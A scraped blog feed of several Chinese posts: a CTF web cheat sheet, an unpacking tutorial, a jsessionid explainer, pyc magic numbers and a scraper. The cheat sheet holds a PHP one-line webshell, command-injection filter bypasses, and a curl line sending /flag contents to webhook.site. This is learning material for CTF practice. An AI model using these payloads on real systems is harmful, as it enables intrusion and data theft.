a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70”;</p><h5 id="php弱类型绕过"><a href="#php弱类型绕过" class="headerlink" title="php弱类型绕过"></a>php弱类型绕过</h5><blockquote><p>MMHUWUV 0e701732711630150438129209816536<br>MAUXXQC 0e478478466848439040434801845361<br>IHKFRNS 0e256160682445802696926137988570<br>GZECLQZ 0e537612333747236407713628225676<br>GGHMVOE 0e362766013028313274586933780773<br>GEGHBXL 0e248776895502908863709684713578<br>EEIZDOI 0e782601363539291779881938479162<br>DYAXWCA 0e424759758842488633464374063001</p></blockquote><h5 id="php强类型比较"><a href="#php强类型比较" class="headerlink" title="php强类型比较"></a>php强类型比较</h5><blockquote><p>&#x3D;&#x3D;&#x3D;会连同数据类型一起比较，同时一些解析也被限制了。我们可以使用数组进行绕过。数组绕过是指我们传值的时候传一个数组上去，比如?id[]&#x3D;1,这个就是使用GET方法传值时候的操作。当md5函数遇到数组之后会返回空值，因为它无法加密数组，于是可以绕过php强类型比较。</p></blockquote><h4 id="php文件上传漏洞"><a href="#php文件上传漏洞" class="headerlink" title="php文件上传漏洞"></a>php文件上传漏洞</h4><p>一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个木马接受 POST 参数中0的值作为值, 我们可以使用蚁剑连接这个木马(密码为 0)<br>上传成功后会返回后端的判断代码, 此时可以知道我们上传的路径为 uploads且文件名不变</p><p>我们可以通过蚁剑进行连接</p><h4 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h4><p><a href="https://www.php.net/manual/zh/function.eval.php">相关文档</a><br>我们可以利用 system 函数执行 Shell 命令,<br>也可用使用 echo file_get_contents(‘&#x2F;flag’); 来输出flag内容  </p><p>下面给出 system 的示例</p><blockquote><p>DT&#x3D;system(‘cat &#x2F;flag’);<br>注意用;来分隔，因为此时已经是一个php语句了</p></blockquote><p>解释:<br>system(‘cat &#x2F;flag’)：system() 函数用于执行系统命令。在这个例子中，system() 函数执行的是 cat &#x2F;flag，它会尝试读取系统中路径为 &#x2F;flag 的文件内容并输出到终端</p><blockquote><p>DT&#x3D;phpinfo();检查版本信息查漏洞</p></blockquote><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>在看了半个小时后终于懂了一点，反序列化就是利用已经存在的函数之间的调用，以及特殊方法绕过对应的检查后利用序列化函数生成一个可以在后面执行并获取代码的漏洞</p><p>POP chain<br>魔术方法：</p><blockquote><p>__construct()   &#x2F;&#x2F;对象创建(new)时会自动调用。<br>__wakeup()        &#x2F;&#x2F;使用unserialize时触发<br>__sleep()        &#x2F;&#x2F;使用serialize时触发<br>__destruct()        &#x2F;&#x2F;对象被销毁时触发<br>__call()        &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic()        &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get()        &#x2F;&#x2F;用于从不可访问的属性读取数据 包括private或者是不存在的<br>__set()        &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset()        &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>__unset()         &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>__toString()    &#x2F;&#x2F;把类当作字符串使用时触发<br>__invoke()             &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发  就是加了括号<br>__autoload()           &#x2F;&#x2F;在代码中当调用不存在的类时会自动调用该方法。<br>的序列化字符串在反序列化对象时与真实存在的参数个数不同时会跳过执行，即当前函数中只有一个参数$flag，若传入的序列化字符串中的参数个数为2即可绕过</p></blockquote><h4 id="RCE过滤"><a href="#RCE过滤" class="headerlink" title="RCE过滤"></a>RCE过滤</h4><h5 id="Windows系统支持的管道符如下："><a href="#Windows系统支持的管道符如下：" class="headerlink" title="Windows系统支持的管道符如下："></a>Windows系统支持的管道符如下：</h5><ol><li>“|”：直接执行后面的语句。</li><li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><h5 id="Linux系统支持的管道符如下："><a href="#Linux系统支持的管道符如下：" class="headerlink" title="Linux系统支持的管道符如下："></a>Linux系统支持的管道符如下：</h5><ol><li>“;”：执行完前面的语句再执行后面的语句。</li><li>“|”：显示后面语句的执行结果。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><p><img src="https://gitee.com/fogpost/photo/raw/master/202409231119238.png" srcset="/img/loading.gif" lazyload></p><h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h5><p><a href="https://blog.csdn.net/Manuffer/article/details/120672448">参考</a></p><ul><li>cat <blockquote><p>cat\tac\more\less\head\tail\nl\tailf<br>单引号 c’’at<br>双引号 c””at<br>shell特殊变量 ca$@t</p></blockquote></li><li>空格<blockquote><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等 %0a(url编码)<br>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串</p></blockquote></li></ul><h4 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h4><h5 id="重定向到文件"><a href="#重定向到文件" class="headerlink" title="重定向到文件"></a>重定向到文件</h5><blockquote><p>cmd_here &gt; 1.txt<br>然后利用wegt命令进行文件下载</p></blockquote><h5 id="curl外带"><a href="#curl外带" class="headerlink" title="curl外带"></a>curl外带</h5><p>可以利用webhook.site建立网络端口监听，<br>然后执行<br>cmd&#x3D;curl <a href="https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/%60cat">https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/`cat</a> &#x2F;flag | base64&#96;<br>来实现base64编码获取</p><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脱壳教程第一课</title>
    <link href="/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/"/>
    <url>/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h3><p>首先查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181712588.png" srcset="/img/loading.gif" lazyload></p><h4 id="手脱"><a href="#手脱" class="headerlink" title="手脱"></a>手脱</h4><p>了解是upx直接od打开，直接往下面翻，或者用esp法直接找到popad跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181714591.png" srcset="/img/loading.gif" lazyload><br>看到先call再jmp确认为OEP入口点<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181715614.png" srcset="/img/loading.gif" lazyload><br>直接od脱壳可运行直接不用管了</p><h3 id="NsPack"><a href="#NsPack" class="headerlink" title="NsPack"></a>NsPack</h3><h4 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h4><p>首先查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181716923.png" srcset="/img/loading.gif" lazyload><br>发现为北斗Nspack可以同上用手脱，或者采用ESP壳，在pushfd之后发现ESP改变，我们选择数据窗口中跟随，然后在数据窗口中选择断点，硬件访问，Word然后直接f9到达出栈位置<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181717350.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181717510.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181719918.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181720629.png" srcset="/img/loading.gif" lazyload><br>然后继续执行直到进入OEP，发现乱码，crtl+a进行分析，发现方法OEP特征<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181721792.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181722929.png" srcset="/img/loading.gif" lazyload><br>脱壳完毕可执行</p><h3 id="FSG"><a href="#FSG" class="headerlink" title="FSG"></a>FSG</h3><h4 id="FSG特殊的IAT修复以及查找"><a href="#FSG特殊的IAT修复以及查找" class="headerlink" title="FSG特殊的IAT修复以及查找"></a>FSG特殊的IAT修复以及查找</h4><p>手动在过程中我们发现这样一个跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181724268.png" srcset="/img/loading.gif" lazyload>在下面的XOR处我们便会跳出函数，直接跑飞函数，但是在这之前有一个大循环，导致我们在一个判断函数之间跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181725004.png" srcset="/img/loading.gif" lazyload><br>我们直接f4执行到此处，进入，发现OPE<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181726582.png" srcset="/img/loading.gif" lazyload><br>OPE在多次查阅之后发现<br>脱壳后发现问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181727890.png" srcset="/img/loading.gif" lazyload><br>在当前的exe程序中无法定位IAT入口点，我们用Import REC修复，在OEP入口点的call函数中我们f7进入查看<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181729836.png" srcset="/img/loading.gif" lazyload><br>发现这些红字调用，我们了解到这是对dll中一些函数的调用，右键一个调用call函数，在数据窗口中打开，选择内存地址，并在数据窗户口中选择长型地址来帮助我们查看<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181731502.png" srcset="/img/loading.gif" lazyload><br>找到这个数据窗口的上下界，计算差值，，按图中填入数值，了解我们的基地址是400000，大小写差值也可以写1000，之后选择无效函数删除，直接导入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181732896.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181733944.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181735661.png" srcset="/img/loading.gif" lazyload></p><p>修理完成</p><h3 id="PECompact"><a href="#PECompact" class="headerlink" title="PECompact"></a>PECompact</h3><p>查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181737511.png" srcset="/img/loading.gif" lazyload><br>手脱技巧，在打开这个文件时，发现有大量的无效函数，我们选择分析之后直接执行，在PEC壳中有一个重要函数，ZxContinue，在发现这个函数时我们便可以进入，快速发现OEP<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181739058.png" srcset="/img/loading.gif" lazyload><br>也可以看我博客中的另外一个关于PECompact的壳</p><h3 id="ASProtect"><a href="#ASProtect" class="headerlink" title="ASProtect"></a>ASProtect</h3><p>查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181759437.png" srcset="/img/loading.gif" lazyload><br>直接手托一路动就行，注意先分析一下，另外的方法看我的另一篇博客</p><h3 id="Upack"><a href="#Upack" class="headerlink" title="Upack"></a>Upack</h3><p>直接ESP即可脱壳</p><h3 id="yoda"><a href="#yoda" class="headerlink" title="yoda"></a>yoda</h3><p>这个也可以ESP</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsessionid是什么？</title>
    <link href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <url>/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>之前不是写了一个爬数据的脚本么，今天发现一个问题，就是jsessonid在刷新之后变了，所以我现在想要找到一个不会变的方法，不过这个修改和学习时间应该会变得比较久，感觉挺高阶的</p><p>看了一些文章将的都是tomcat的的例子，先讲讲什么是session，浏览器第一次访问服务器会生成一个session保存相关信息，会有一个sessionid来对应这个session，<strong>那么我们就想可不可以利用这个id直接去查session的值</strong>  </p><p>tomcat的StandardManager类将session存储在内存中也可以持久化到文件中，sessionid是一个指代session在服务器端位置的值，存储在客户端的cookie上，不会将session保存在本地,session也只能通过invalidate或超时来销毁</p><blockquote><p>那么Session在何时创建呢？当然还是在服务器端程序运行的过程中创建的，不同语言实现的应用程序有不同创建Session的方法，而在Java中是通过调用HttpServletRequest的getSession方法（使用true作为参数）创建的。在创建了Session的同时，服务器会为该Session生成唯一的Session id，而这个Session id在随后的请求中会被用来重新获得已经创建的Session；在Session被创建之后，就可以调用Session相关的方法往Session中增加内容了，而这些内容只会保存在服务器中，发到客户端的只有Session id；当客户端再次发送请求的时候，会将这个Session id带上，服务器接受到请求之后就会依据Session id找到相应的Session，从而再次使用之。</p></blockquote><p>创建：sessionid第一次产生是在直到某server端程序调用 HttpServletRequest.getSession(true)这样的语句时才被创建。</p><p>删除：超时；程序调用HttpSession.invalidate()；程序关闭；</p><p>session存放在哪里：服务器端的内存中。不过session可以通过特殊的方式做持久化管理（memcache，redis）。</p><p>session的id是从哪里来的，sessionID是如何使用的：当客户端第一次请求session对象时候，服务器会为客户端创建一个session，并将通过特殊算法算出一个session的ID，用来标识该session对象</p><p>session会因为浏览器的关闭而删除吗？<br>不会，session只会通过上面提到的方式去关闭。</p><p>下面是tomcat中session的创建：</p><blockquote><p>ManagerBase是所有session管理工具类的基类，它是一个抽象类，所有具体实现session管理功能的类都要继承这个类，该类有一个受保护的方法，该方法就是创建sessionId值的方法：<br>（ tomcat的session的id值生成的机制是一个随机数加时间加上jvm的id值，jvm的id值会根据服务器的硬件信息计算得来，因此不同jvm的id值都是唯一的），<br>StandardManager类是tomcat容器里默认的session管理实现类，<br>它会将session的信息存储到web容器所在服务器的内存里。<br>PersistentManagerBase也是继承ManagerBase类，它是所有持久化存储session信息的基类，PersistentManager继承了PersistentManagerBase，但是这个类只是多了一个静态变量和一个getName方法，目前看来意义不大， 对于持久化存储session，tomcat还提供了StoreBase的抽象类，它是所有持久化存储session的基类，另外tomcat还给出了文件存储FileStore和数据存储JDBCStore两个实现。</p></blockquote><p>所以会出现以下三种情况：</p><blockquote><p>1、server没有关闭，并在session对象销毁时间内，当客户端再次来请求serve端的servlet或jsp时，将会把将第一次请求该serve时生成的sessionid带到请求头上向server端发送，server端收到sessionid后根据此sessionid会去搜索server对应的session对象并直接返回这个session对象，此时不会重新创建session对象。<br>2、当server关闭（之前产生的session对象也就消亡了），或者session对象过了销毁时间，浏览器窗口没有关闭，并在本窗口继续请求server端的servlet或者jsp时，此时同样会将sessionid 发送到 服务端，server拿着id去找对应的session对象；但是此时session对象已经不存在了。所以会重新生成一个session和对应的sessionid ，将这个新的id以响应报文的形式发到浏览器的内核中，重新更新cookie。<br>3、当server没有关闭，并且session对象在其销毁时间内，当请求一个jsp页面返回客户端后，关闭此浏览器窗口，此时其内存中的sessionid也就随之销毁。在重新去请求server端的servlet或者jsp时，会重新生成一个sessionid给客户端浏览器，并且存在浏览器内存中。</p></blockquote><p>我们使用的其实就是将已经存放的cookie来重放获取对应的数据，不过在刷新过后应该会调用HttpSession.invalidate()，并在下次请求时创建一个新的session来进行访问，所以要是想改的的话要么就是对应的服务器端有session持续化保存机制，不然我每隔两天就要手动更新session难受哦，&#x2F;(ㄒoㄒ)&#x2F;~~</p><p><strong>cookie的保存方式有两种：</strong><br>如果没有设置cookie的失效时间，这个cookie就存在与浏览器进程；</p><p>设置了cookie的失效时间，那么这个cookie就存在于硬盘。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Cookie的一些基本设置</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;Admin-Token&quot;</span>, token);<br><br>        Cookie[] cookie2 = request.getCookies();<br>        <span class="hljs-comment">//request.getContextPath()   mdrwebrest</span><br>        cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);        <span class="hljs-comment">//设置cookies有效路径</span><br>        <span class="hljs-comment">//设置cookie有效时间  正数：存到硬盘，负数存到浏览器，0立刻销毁</span><br>        cookie.setMaxAge();      <br>        cookie.setDomain(loginToMDRConfig.getIP()); <span class="hljs-comment">//跨域</span><br>        response.addCookie(cookie);<br></code></pre></td></tr></table></figure><p>下面是实现机制图<br><img src="https://gitee.com/fogpost/photo/raw/master/202409161116311.png" srcset="/img/loading.gif" lazyload><br>文章给出的获取sessionid方法是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpSession session=request.getSession(); <span class="hljs-comment">//获取session</span><br>String sessionid=session.getId();  <span class="hljs-comment">//获取sessionid</span><br>Cookie cookie=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;JSESSIONID&quot;</span>,sessionid); <span class="hljs-comment">//手动设置一个硬盘存储COOKIE，这个cooike时存在硬盘的，不是存在浏览器线程的</span><br>cookie.setMaxAge(<span class="hljs-number">30</span>*<span class="hljs-number">60</span>);<br>response.addCookie(cookie); <span class="hljs-comment">//将COOKIE设置到响应上</span><br></code></pre></td></tr></table></figure><p>其实我们可以假借服务器自己的手，通过burp抓包来实现获取对应的sessionid，进一步获取对应报文(这不就是我之前干过的么，现在学了一遍原理，👿我了)</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jsessionid</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pymagic</title>
    <link href="/2024/09/15/pythonticke/"/>
    <url>/2024/09/15/pythonticke/</url>
    
    <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enum PycMagic &#123;<br>    MAGIC_1_0 = <span class="hljs-number">0x00999902</span>,<br>    MAGIC_1_1 = <span class="hljs-number">0x00999903</span>, /* Also covers <span class="hljs-number">1.2</span> */<br>    MAGIC_1_3 = <span class="hljs-number">0x0A0D2E89</span>,<br>    MAGIC_1_4 = <span class="hljs-number">0x0A0D1704</span>,<br>    MAGIC_1_5 = <span class="hljs-number">0x0A0D4E99</span>,<br>    MAGIC_1_6 = <span class="hljs-number">0x0A0DC4FC</span>,<br> <br>    MAGIC_2_0 = <span class="hljs-number">0x0A0DC687</span>,<br>    MAGIC_2_1 = <span class="hljs-number">0x0A0DEB2A</span>,<br>    MAGIC_2_2 = <span class="hljs-number">0x0A0DED2D</span>,<br>    MAGIC_2_3 = <span class="hljs-number">0x0A0DF23B</span>,<br>    MAGIC_2_4 = <span class="hljs-number">0x0A0DF26D</span>,<br>    MAGIC_2_5 = <span class="hljs-number">0x0A0DF2B3</span>,<br>    MAGIC_2_6 = <span class="hljs-number">0x0A0DF2D1</span>,<br>    MAGIC_2_7 = <span class="hljs-number">0x0A0DF303</span>,<br> <br>    MAGIC_3_0 = <span class="hljs-number">0x0A0D0C3A</span>,<br>    MAGIC_3_1 = <span class="hljs-number">0x0A0D0C4E</span>,<br>    MAGIC_3_2 = <span class="hljs-number">0x0A0D0C6C</span>,<br>    MAGIC_3_3 = <span class="hljs-number">0x0A0D0C9E</span>,<br>    MAGIC_3_4 = <span class="hljs-number">0x0A0D0CEE</span>,<br>    MAGIC_3_5 = <span class="hljs-number">0x0A0D0D16</span>,<br>    MAGIC_3_5_3 = <span class="hljs-number">0x0A0D0D17</span>,<br>    MAGIC_3_6 = <span class="hljs-number">0x0A0D0D33</span>,<br>    MAGIC_3_7 = <span class="hljs-number">0x0A0D0D42</span>,<br>    MAGIC_3_8 = <span class="hljs-number">0x0A0D0D55</span>,<br>    MAGIC_3_9 = <span class="hljs-number">0x0A0D0D61</span>,<br>    MAGIC_3_10 = <span class="hljs-number">0x0A0D0D6F</span>,<br>    MAGIC_3_11 = <span class="hljs-number">0x0A0D0DA7</span>,<br>    MAGIC_3_12 = <span class="hljs-number">0x0A0D0DCB</span>,<br> <br>    INVALID = <span class="hljs-number">0</span>,<br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown语法</title>
    <link href="/2024/09/14/markdown%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/09/14/markdown%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">languagekey1C1cActionScriptactionscriptApacheapacheAppleScriptapplescriptAsciiDocasciidocAspectJasciidocAutoHotkeyautohotkeyAVR AssembleravrasmAxaptaaxaptaBashbashBrainFuckbrainfuckCap’n ProtocapnprotoClojure REPLclojureClojureclojureCMakecmakeCoffeeScriptcoffeescriptC++cppC#csCSScssDdDartdDelphidelphiDiffdiffDjangodjangoDOS.batdosDustdustElixirelixirERB(Embedded Ruby)erbErlang REPLerlang-replErlangerlangFIXfixF#fsharpG-code(ISO 6983)gcodeGherkingherkinGLSLglslGogoGradlegradleGroovygroovyHamlhamlHandlebarshandlebarsHaskellhaskellHaxehaxeHTMLhtmlHTTPhttpIni fileiniJavajavaJavaScriptjavascriptJSONjsonLassolassoLesslessLisplispLiveCodelivecodeserverLiveScriptlivescriptLualuaMakefilemakefileMarkdownmarkdownMathematicamathematicaMatlabmatlabMEL (Maya Embedded Language)melMercurymercuryMizarmizarMonkeymonkeyNginxnginxNimrodnimrodNixnixNSISnsisObjective CobjectivecOCamlocamlOxygeneoxygeneParser 3parser3PerlperlPHPphpPowerShellpowershellProcessingprocessingPython’s profiler outputprofileProtocol BuffersprotobufPuppetpuppetPythonpythonQqRrRenderMan RIBribRoboconfroboconfRenderMan RSLrslRubyrubyOracle Rules LanguageruleslanguageRustrustScalascalaSchemeschemeScilabscilabSCSSscssSmalismaliSmallTalksmalltalkSMLsmlSQLsqlStatastataSTEP Part21(ISO 10303-21)step21StylusstylusSwiftswiftTcltclTextextexttext/plainThriftthriftTwigtwigTypeScripttypescriptValavalaVB.NETvbnetVBScript in HTMLvbscript-htmlVBScriptvbscriptVerilogverilogVHDLvhdlVim ScriptvimIntel x86 Assemblyx86asmXLxlXMLxmlYAMLyml</code></pre>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫初识</title>
    <link href="/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>由于寝室老是没电导致我的电脑处于工作状态开机，气死我了，我便想用python来了解目前的电费是多少并给我发邮件，首先我们要了解一下基本的python发送响应包的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 GET 请求</span><br>url = <span class="hljs-string">&#x27;https://example.com&#x27;</span>  <span class="hljs-comment"># 将此替换为你要访问的网址</span><br>response = requests.get(url)<br><br><span class="hljs-comment"># 检查请求是否成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求成功！&quot;</span>)<br>    <span class="hljs-comment"># 获取网页内容</span><br>    content = response.text  <span class="hljs-comment"># 返回HTML内容</span><br>    <span class="hljs-built_in">print</span>(content)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 POST 请求</span><br>url = <span class="hljs-string">&#x27;https://example.com/api&#x27;</span>  <span class="hljs-comment"># 将此替换为实际的API URL</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;your_username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;your_password&#x27;</span>&#125;  <span class="hljs-comment"># 传递的数据</span><br>response = requests.post(url, data=data)<br><br><span class="hljs-comment"># 检查请求是否成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST 请求成功！&quot;</span>)<br>    <span class="hljs-comment"># 获取响应内容</span><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>在了解之后我们用bp抓包，发现一个问题，我们不再微信程序时网页会有一个自校验的情况，让我们在微信中打开，这无疑是我们不希望的不过我们可以修改我们的请求头部伪造我们在微信中的情景</p><p>这是在User agent 修改，这样服务端便会认为我们在微信中了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br></code></pre></td></tr></table></figure><p>下面是我们的请求报文</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">POST /app/app/api/user/searchBindHouseListForMoney HTTP/1.1<br>Host: xdxfdf.xtu.edu.cn<br>Content-Length: 58<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: zh-CN<br>User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 